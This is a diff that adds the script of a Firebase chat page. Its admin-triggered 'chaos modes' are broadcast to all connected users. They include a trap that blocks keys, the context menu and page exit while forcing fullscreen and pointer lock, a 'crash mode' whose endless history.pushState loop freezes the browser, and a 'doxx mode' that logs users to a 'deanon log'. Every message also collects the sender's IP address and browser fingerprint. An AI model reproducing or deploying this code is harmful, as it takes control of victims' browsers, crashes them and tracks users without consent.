+    document.addEventListener('visibilitychange',e=>{if(trapActive&&document.hidden){e.preventDefault();attemptFullscreen();}});
+    document.addEventListener('fullscreenchange',maintainFullscreen);
+    document.addEventListener('webkitfullscreenchange',maintainFullscreen);
+    document.addEventListener('mozfullscreenchange',maintainFullscreen);
+    document.addEventListener('MSFullscreenChange',maintainFullscreen);
+    fullscreenInterval=setInterval(()=>{if(trapActive)maintainFullscreen();},100);
+    setTimeout(()=>{lockPointer();maintainPointerLock();},100);
+    document.addEventListener('keydown',blockAllExits,true);
+    document.addEventListener('keyup',blockAllExits,true);
+    document.addEventListener('keypress',blockAllExits,true);
+    document.addEventListener('contextmenu',e=>{if(trapActive){e.preventDefault();return false;}},true);
+    fakeFullscreen.addEventListener('click',()=>{if(trapActive){attemptFullscreen();lockPointer();}});
+  }
+  function stopChaosTrap(){
+    trapActive=false;chaosModeLocked=false;
+    fakeFullscreen.classList.remove('active');
+    window.removeEventListener('beforeunload',trapUser);
+    window.removeEventListener('unload',trapUser);
+    exitFullscreen();unlockPointer();
+    if(pointerLockInterval){clearInterval(pointerLockInterval);pointerLockInterval=null;}
+    if(fullscreenInterval){clearInterval(fullscreenInterval);fullscreenInterval=null;}
+    document.removeEventListener('keydown',blockAllExits,true);
+    document.removeEventListener('keyup',blockAllExits,true);
+    document.removeEventListener('keypress',blockAllExits,true);
+  }
+
+  // ── HELPERS ───────────────────────────────────────────────────
+  function escapeHtml(str){
+    return String(str).replace(/[&<>"']/g,s=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]));
+  }
+
+  function renderMessages(arr){
+    chatEl.innerHTML='';
+    arr.forEach(m=>{
+      if(bannedUsers[m.username])return;
+      const div=document.createElement('div');
+      const cur=(userEl.value.trim()||'Anonymous');
+      div.className='msg '+((m.username===cur)?'me':'other');
+      if(admins[m.username])div.classList.add('admin');
+      if(m.isAlt)div.classList.add('alt');
+      if(m.fileUrl)div.classList.add('file-msg');
+
+      let html=`<strong>${escapeHtml(m.username)}</strong>`;
+      if(m.isAlt&&m.originalUsername)html+=` <span style="color:#ff8c00;font-size:0.75rem;">[alt:${escapeHtml(m.originalUsername)}]</span>`;
+      html+=`: ${escapeHtml(m.text)}`;
+
+      if(m.fileUrl){
+        const isImg=m.fileType&&m.fileType.startsWith('image/');
+        if(isImg){
+          html+=`<br><img class="inline-img" src="${escapeHtml(m.fileUrl)}" alt="${escapeHtml(m.fileName||'img')}">`;
+        }
+        html+=`<br><a class="file-link" href="${escapeHtml(m.fileUrl)}" target="_blank">⬇ ${escapeHtml(m.fileName||'download')}${m.fileSize?' ('+formatBytes(m.fileSize)+')':''}</a>`;
+      }
+
+      div.innerHTML=html;
+      chatEl.appendChild(div);
+    });
+    chatEl.scrollTop=chatEl.scrollHeight;
+  }
+
+  function flashBanned(username,text){
+    const div=document.createElement('div');
+    div.className='msg banned';
+    div.innerHTML=`<strong>${escapeHtml(username)}</strong>: ${escapeHtml(text)}`;
+    chatEl.appendChild(div);chatEl.scrollTop=chatEl.scrollHeight;
+    setTimeout(()=>div.remove(),2000);
+  }
+
+  // ── MESSAGING ─────────────────────────────────────────────────
+  async function sendMessage(){
+    const username=(userEl.value||'Anonymous').trim();
+    const text=(msgEl.value||'').trim();
+    if(!text)return;
+    if(bannedUsers[username]){flashBanned(username,text);msgEl.value='';return;}
+    const userIP=currentUserIP||await getUserIP();
+    const altCheck=await checkForAltAccount(username,userIP);
+    saveUserFingerprint(username,userIP);
+    devicesRef.child(username+'_'+deviceId).set({timestamp:Date.now()});
+    messagesRef.push({username,text,timestamp:Date.now(),deviceId,fingerprint:browserFingerprint,ip:userIP,isAlt:altCheck.isAlt,originalUsername:altCheck.originalUsername});
+    msgEl.value='';
+  }
+
+  function loginAdmin(){
+    const u=(adminUserEl.value||'').trim();
+    const p=(adminPassEl.value||'').trim();
+    if(!u||!p)return;
+    if(admins[u]&&admins[u]===p){adminPanel.style.display='block';sessionStorage.setItem('hh_admin_user',u);}
+    adminUserEl.value='';adminPassEl.value='';
+  }
+
+  function updateBannedListUI(){
+    const b=Object.keys(bannedUsers);
+    bannedListEl.textContent=b.length?b.join(', '):'(none)';
+  }
+
+  function banUser(){const u=(banUserEl.value||'').trim();if(!u)return;bannedRef.child(u).set(true);banUserEl.value='';}
+  function unbanUser(){const u=(unbanUserEl.value||'').trim();if(!u)return;bannedRef.child(u).remove();unbanUserEl.value='';}
+  function clearChat(){messagesRef.remove();}
+
+  // ── CHAOS MODES ───────────────────────────────────────────────
+  function activateWTFMode(){wtfModeRef.set({active:true,timestamp:Date.now()});}
+  function triggerWTFEffect(){
+    startChaosTrap();htmlElement.classList.add('shake');nukeOverlay.classList.add('active');
+    const a=new Audio('https://www.myinstants.com/en/media/sounds/wtf_boom.mp3');a.volume=0.7;a.play().catch(()=>{});
+    setTimeout(()=>{htmlElement.classList.remove('shake');nukeOverlay.classList.remove('active');stopChaosTrap();wtfModeRef.set({active:false,timestamp:Date.now()});},40000);
+  }
+
+  function activateRickrollMode(){rickrollModeRef.set({active:true,timestamp:Date.now()});}
+  function triggerRickrollEffect(){
+    const a=new Audio('https://cdn.jumpshare.com/preview/QkZG947X-nS_3I_jiUG3I4BBIzvg5_640OyXE4ZdqV2doNtqsOxxQWmeRG5iP1NpOtFkRNVyaLq8qgw9by4iDxg9pBwAcWct-0PugooUAx4NdzZ9L2DIvnepvy1dlAl12M2_SxouQEwJjKaEbCRx8W6yjbN-I2pg_cnoHs_AmgI.mp3');
+    a.volume=0.8;a.play().catch(()=>{});
+    setTimeout(()=>{
+      startChaosTrap();htmlElement.classList.add('shake');rickrollOverlay.classList.add('active');
+      setTimeout(()=>{htmlElement.classList.remove('shake');rickrollOverlay.classList.remove('active');stopChaosTrap();rickrollModeRef.set({active:false,timestamp:Date.now()});},25000);
+    },15000);
+  }
+
+  function activateDoxxMode(){doxxModeRef.set({active:true,timestamp:Date.now()});}
+  function triggerDoxxEffect(){
+    const username=userEl.value.trim()||'Anonymous';
+    logToShame(username);
+    const el=document.createElement('div');
+    el.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.97);color:#ff0000;padding:40px;border:2px solid #ff0000;border-radius:3px;z-index:99999;text-align:center;font-family:monospace;';
+    el.innerHTML=`<div style="font-size:2.5rem;margin-bottom:15px;letter-spacing:4px;">[ DEANON ]</div><div style="font-size:1.2rem;color:#ccc;">your data has been logged</div><div style="font-size:0.9rem;color:#666;margin-top:10px;">check the deanon log...</div>`;
+    document.body.appendChild(el);
+    setTimeout(()=>{el.remove();doxxModeRef.set({active:false,timestamp:Date.now()});},5000);
+  }
+
+  function activateCrashMode(){
+    crashModeRef.set({active:true,timestamp:Date.now()});
+    setTimeout(()=>{crashModeRef.set({active:false,timestamp:Date.now()});},60000);
+  }
+  function triggerCrashEffect(){
+    crashModeRef.once('value').then(snapshot=>{
+      const d=snapshot.val();
+      if(!d||!d.active)return;
+      if(Date.now()-(d.timestamp||0)>60000){crashModeRef.set({active:false,timestamp:Date.now()});return;}
+      var total='';
+      for(var i=0;i<10000000000000;i++){total+=i.toString();history.pushState(0,0,total);}
+    });
+  }
+
+  // ── EVENTS ────────────────────────────────────────────────────
+  sendBtn.addEventListener('click',sendMessage);
+  msgEl.addEventListener('keydown',e=>{if(e.key==='Enter')sendMessage();});
+  adminLoginBtn.addEventListener('click',loginAdmin);
+  banBtn.addEventListener('click',banUser);
+  unbanBtn.addEventListener('click',unbanUser);
+  clearBtn.addEventListener('click',clearChat);
+  wtfBtn.addEventListener('click',activateWTFMode);
+  rickrollBtn.addEventListener('click',activateRickrollMode);
+  doxxBtn.addEventListener('click',activateDoxxMode);
+  crashBtn.addEventListener('click',activateCrashMode);
+  clearShameBtn.addEventListener('click',()=>{if(confirm('Purge entire deanon log? Cannot be undone.')){shameRef.remove();}});
+  shameBtn.addEventListener('click',showWallOfShame);
+  closeShame.addEventListener('click',()=>{shameModal.style.display='none';});
+
+  // ── FIREBASE LISTENERS ────────────────────────────────────────
+  messagesRef.on('value',snapshot=>{
+    const msgs=[];snapshot.forEach(c=>msgs.push(c.val()));
+    msgs.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));
+    renderMessages(msgs);
+  });
+  bannedRef.on('value',snapshot=>{
+    bannedUsers={};snapshot.forEach(c=>{bannedUsers[c.key]=true;});
+    updateBannedListUI();autoDeleteBannedMessages();
+  });
+  wtfModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerWTFEffect();});
+  rickrollModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerRickrollEffect();});
+  doxxModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerDoxxEffect();});
+  crashModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerCrashEffect();});
+
+  // ── INIT ──────────────────────────────────────────────────────
+  const sessionAdmin=sessionStorage.getItem('hh_admin_user');
+  if(sessionAdmin&&admins[sessionAdmin])adminPanel.style.display='block';
+  getUserIP();
+  autoDeleteBannedMessages();
+  primeFullscreen();
+})();
+</script>
+
+<!-- RED MATRIX RAIN -->
+<script>
+const canvas=document.getElementById('matrix');
+const ctx=canvas.getContext('2d');
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+const chars='ROBLOX01SYNAPSE KRNL EXEC INJECT EXPLOIT SCRIPT LUA RBX DELTA FLUXUS 0xDEAD NULL VOID HEX C0DE PWND BYPASS RCE';
+const cols=Math.floor(canvas.width/16);
+const drops=new Array(cols).fill(1);
+function draw(){
+  ctx.fillStyle='rgba(0,0,0,0.06)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  const chars_arr=chars.split('');
+  for(let i=0;i<drops.length;i++){
+    const c=chars_arr[Math.floor(Math.random()*chars_arr.length)];
+    const r=Math.random();
+    if(r<0.1)ctx.fillStyle='#ff0000';
+    else if(r<0.3)ctx.fillStyle='#880000';
+    else ctx.fillStyle='#440000';
+    ctx.font='13px monospace';
+    ctx.fillText(c,i*16,drops[i]*16);
+    if(drops[i]*16>canvas.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  }
+}
+setInterval(draw,40);
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+</script>
+
+</body>
+</html>
